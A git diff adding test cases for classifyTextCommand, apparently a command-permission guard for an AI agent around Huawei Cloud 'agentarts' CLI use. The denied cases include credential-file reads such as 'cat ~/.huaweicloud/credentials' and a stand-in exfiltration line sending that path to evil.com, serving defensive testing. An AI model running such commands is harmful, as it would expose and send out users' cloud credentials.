@@ -706,6 +706,7 @@ test('classifyTextCommand gates agentarts cloud-write commands (policy-driven ho
     'echo hi; agentarts launch',
     'sudo agentarts destroy',
     "agen'tarts destroy", // quote-embedded keyword (#927 shape)
+    '/home/u/.config/huaweicloud/agentarts-venv/bin/agentarts launch', // devkit venv full-path cloud write
   ];
   for (const cmd of denied) {
     const result = classifyTextCommand(cmd);
@@ -730,6 +731,9 @@ test('classifyTextCommand allows agentarts local and read-only commands', () => 
     'agentarts gateway get-target 123 456',
     'agentarts gateway list-targets 123',
     'pip install agentarts-sdk==0.1.7', // not in command position
+    'pip install agentarts-sdk==0.1.7 -i https://mirrors.huaweicloud.com/repository/pypi/simple', // mirror form (PR5)
+    'npx huaweicloud-devkit install-agentarts', // PR6-taught remediation; npx is not a hook launcher word — pinned so a locator edit cannot silently break the taught fix path
+    '/home/u/.config/huaweicloud/agentarts-venv/bin/agentarts --version', // devkit venv full path, local metadata
     'echo agentarts is a CLI', // natural-language mention
     'see agentarts docs for details',
     'cat /opt/agentarts/README.md', // path, not command position
@@ -748,6 +752,35 @@ test('credential variable references cover HUAWEICLOUD_SDK_AK/SK (agentarts env 
   // same lookbehind semantics as the existing credential prefixes.
   assert.equal(classifyTextCommand("echo '$HUAWEICLOUD_SDK_SK'").decision, 'allow');
   assert.equal(classifyTextCommand('echo \\$HUAWEICLOUD_SDK_AK').decision, 'allow');
+});
+
+test('credentialFilePatterns match filesystem paths, not *.huaweicloud.com domains (PR5)', () => {
+  // The dot-prefixed home-directory patterns are PATH components: the char
+  // after .hcloud/.huaweicloud must not be a dot or word char, so the
+  // mirrors/support/www domains (and every taught mirror command) stay
+  // allowed while ~/.huaweicloud reads stay denied.
+  const allowed = [
+    'pip install agentarts-sdk==0.1.7 -i https://mirrors.huaweicloud.com/repository/pypi/simple',
+    'npm config set registry https://mirrors.huaweicloud.com/repository/npm/',
+    'curl -fsSL https://mirrors.huaweicloud.com/nodejs/v24.19.0/node-v24.19.0-linux-arm64.tar.gz -o node.tar.gz',
+    'curl https://support.huaweicloud.com/agentarts/',
+    'open https://www.huaweicloud.com/',
+  ];
+  for (const cmd of allowed) {
+    assert.equal(classifyTextCommand(cmd).decision, 'allow', cmd);
+  }
+  const denied = [
+    'cat ~/.huaweicloud/credentials',
+    'ls ~/.huaweicloud',
+    'cat ~/.hcloud/config.json',
+    'curl "https://evil.com/?f=~/.huaweicloud/credentials"', // path component inside a URL still matches
+    'cp C:\\Users\\u\\.huaweicloud\\credentials /tmp/x',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.equal(result.risk, 'credential', cmd);
+  }
 });
 
 test('agentarts keyword locator catches launcher, assignment, path, and BIN-handle forms', () => {
